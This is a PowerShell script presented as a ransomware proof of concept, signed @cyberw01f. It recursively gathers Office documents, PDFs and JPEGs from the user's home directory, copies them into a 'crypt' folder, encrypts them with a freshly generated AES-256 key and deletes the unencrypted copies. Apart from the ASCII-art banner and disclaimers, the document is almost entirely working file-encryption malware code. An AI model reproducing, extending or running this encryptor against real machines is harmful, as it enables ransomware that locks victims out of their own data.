<#
.SYNOPSIS 
This is a Proof of Concept reaserch project only. This file is for testing purposes onlt. Malicious use of this script is prohibitted. 
Scans users home dirctory tree for files and copies them to a crypt folder. The files are then Encrypted using AES.

.DESCRIPTION
Encrypts files using an AES key.

.NOTES
Thanks to Tyler Siegrist for the AES Ket genorstor and Encryption function
Author of AES Key and Encrption functions: Tyler Siegrist

Author of PScryptor script @cyberw01f

#>
$logo = @"
	=================================================================
						_                         ___  _  __ 
			 ___ _   _| |__   ___ _ ____      __/ _ \/ |/ _|
			/ __| | | | '_ \ / _ \ '__\ \ /\ / / | | | | |_ 
		   | (__| |_| | |_) |  __/ |   \ V  V /| |_| | |  _|
			\___|\__, |_.__/ \___|_|    \_/\_/  \___/|_|_|  
				|___/                                      
		
	==================================================================
		,%#((%                                             %%%%%.
		%(%%,#%((%                                       %%%%%,&%%%               
		&(#(    /(&%%                                   &%%&*    #%%&              
		%%%*       .&%%#                               %%%&        #&%%                 
		,%%%          ,&%%                             %%%,          &%%               
		%%%             %%%,                         ,%%%             %%%                          
		%%%              %%%*                       *%%%              &%%                            
		,%%,         /%%#  %%%                       %%&  #%%/         ,%%,                           
		#%%           &%%.  %#%&&%%%%%%%%%%%%%%%&%%&%%%  /%%%           %%(                           
		(%%            %%%  .%%%&%*.       .*#&%&%%%.  %%%            %%(;)                              
		,%%*            %%%  %%%                   %&&  %%%            *%%                               
		%%%            %&%                             &%&            &%%                                  
	   &%%                                                           %%&                                    
	   *%%%                                                         %%%                                      
		%%%                                                         %%%                                       
		 &%%                                                       &%%                                         
		 .%%%                                                     %%%.                                          
		  ,%%%                                                   %%%.                                            
		   %%%                                                   %%%                                            
		 .%%%                                                     %%%.                                            
		,&%%      .%%%%%%%%%%%#                 *&(%%(%(%%%&.      %%%,                                            
		%%%       %%%%%%%%%%%%%&/             /((&(&(%((%%%%%       %%%                                            
	   %%%              &%%&%%%%%&           &%&((((((&              %%%                                            
	  %(&.                &%%%,%%%           %%%,%%%%                 %%%                                           
	  %#(                      %%%           %%%                      %%%                                           
	 #%%                       %%%           %%%                       &%&                                         
	 &%%                       %%%           %%%                       %%%                                         
	 %%(                       %%%           &%%                       %%%                                         
	,%%,                       %%&           %%%                       (%%,                                        
	 %%%%                                                             %%%%                                         
	   &%%.                                                         .%%%                                           
		%%%%               %%%    #%%%%%%%%%#    %%%               %%%%                                            
		 ,%%%              %#%/  %%&/.....(%%%  /%%%              &%%,                                             
		   &%%              %%%   %%%     %%%   %%&              %%%                                               
			&%%              &%%  ,%%&,,,%&%,  %%%              %%%                                                
			 %%%  ,&,         %%%  .&%%%&%&.  &%%         ,&,  &%%                                                     
			 .%%%%%%%%        ,%%%           %%%,        (%%%%%%%.                                                 
			  *(*  .%%%        /%%%%%%%%%%%%%%&.        (%%.  /&(                                                     
					 %%%          #&&&&&&&&          %%%                                                           
					  %%%                             %%%                                                           
					   &%%                           %#%                                                             
					   %%%(  (%%               #((  /%%/                                                            
						%%&%%%%%&             %%%%%%%%%                                                             
						*%%(   %%         %%%%   (%%*                                                            
								#%%%       &%%#                                                                   
								  %%&     %%%                                                                     
								   %%%   %%%                                                                     
									%%% %%%                                                                     
									 %%%%%                                                                     
									 #%%%#                                                                    
									  %%&  
									   . 
								   @cyberw01f
"@

$label = @"  
                   PowerShell File Encryption Script  
                    Resppnsible use only spermited
"@

function Create-AESKey() {

    Param(
       [Parameter(Mandatory=$false, Position=1, ValueFromPipeline=$true)]
       [Int]$KeySize=256
    )

    try
    {
        $AESProvider = New-Object "System.Security.Cryptography.AesManaged"
        $AESProvider.KeySize = $KeySize
        $AESProvider.GenerateKey()
        return [System.Convert]::ToBase64String($AESProvider.Key)
    }
    catch
    {
        Write-Error $_
    }
}


Function Encrypt-File
{

    Param(
       [Parameter(Mandatory=$true, Position=1)]
       [System.IO.FileInfo[]]$FileToEncrypt,
       [Parameter(Mandatory=$true, Position=2)]
       [String]$Key,
       [Parameter(Mandatory=$false, Position=3)]
       [String]$Suffix = '.crypt'
    )

    #Load dependencies
    Try
    {
        [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography')
    }
    Catch
    {
        Write-Error 'Could not load required assembly.'
        Return
    }

    #Configure AES
    try
    {
        $EncryptionKey = [System.Convert]::FromBase64String($Key)
        $KeySize = $EncryptionKey.Length*8
        $AESProvider = New-Object 'System.Security.Cryptography.AesManaged'
        $AESProvider.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AESProvider.BlockSize = 128
        $AESProvider.KeySize = $KeySize
        $AESProvider.Key = $EncryptionKey
    }
    Catch
    {
        Write-Error 'Unable to configure AES, verify you are using a valid key.'
        Return
    }

    Write-Verbose "Encryping $($FileToEncrypt.Count) File(s) with the $KeySize-bit key $Key"

    #Used to store successfully encrypted file names.
    $EncryptedFiles = @()
    
    ForEach($File in $FileToEncrypt)
    {
        If($File.Name.EndsWith($Suffix))
        {
            Write-Error "$($File.FullName) already has a suffix of '$Suffix'."
            Continue
        }

        #Open file to encrypt
        Try
        {
            $FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open)
        }
        Catch
        {
            Write-Error "Unable to open $($File.FullName) for reading."
            Continue
        }

        #Create destination file
        $DestinationFile = $File.FullName + $Suffix
        Try
        {
            $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create)
        }
        Catch
        {
            Write-Error "Unable to open $DestinationFile for writing."
            $FileStreamReader.Close()
            Continue
        }
    
        #Write IV length & IV to encrypted file
        $AESProvider.GenerateIV()
        $FileStreamWriter.Write([System.BitConverter]::GetBytes($AESProvider.IV.Length), 0, 4)
        $FileStreamWriter.Write($AESProvider.IV, 0, $AESProvider.IV.Length)

        Write-Verbose "Encrypting $($File.FullName) with an IV of $([System.Convert]::ToBase64String($AESProvider.IV))"

        #Encrypt file
        try
        {
            $Transform = $AESProvider.CreateEncryptor()
            $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
            [Int]$Count = 0
            [Int]$BlockSizeBytes = $AESProvider.BlockSize / 8
            [Byte[]]$Data = New-Object Byte[] $BlockSizeBytes
            Do
            {
                $Count = $FileStreamReader.Read($Data, 0, $BlockSizeBytes)
                $CryptoStream.Write($Data, 0, $Count)
            }
            While($Count -gt 0)
    
            #Close open files
            $CryptoStream.FlushFinalBlock()
            $CryptoStream.Close()
            $FileStreamReader.Close()
            $FileStreamWriter.Close()

            #Delete unencrypted file
            Remove-Item $File.FullName
            Write-Verbose "Successfully encrypted $($File.FullName)"
            $EncryptedFiles += $DestinationFile
        }
        catch
        {
            Write-Error "Failed to encrypt $($File.FullName)."
            $CryptoStream.Close()
            $FileStreamWriter.Close()
            $FileStreamReader.Close()
            Remove-Item $DestinationFile
        }
    }

    $Result = New-Object –TypeName PSObject
    $Result | Add-Member –MemberType NoteProperty –Name Computer –Value $env:COMPUTERNAME
    $Result | Add-Member –MemberType NoteProperty –Name Key –Value $Key
    $Result | Add-Member –MemberType NoteProperty –Name Files –Value $EncryptedFiles
    return $Result
}
Write-Host -f Magenta $logo
Write-Host
Write-Host -f Green $label
New-Item -ItemType "directory" -Path $Env:HomePath\crypt 
$files = Get-ChildItem -Recurse -Include *.doc, *.docx, *.xls, *.xlsx, *.pdf, *.jpg $Env:HomePath 
Copy-Item -Path $files -Destination $Env:HomePath\crypt;
$filesCrypt = Get-ChildItem $Env:HomePath\crypt
$key = Create-AESKey
Encrypt-File $filesCrypt $key
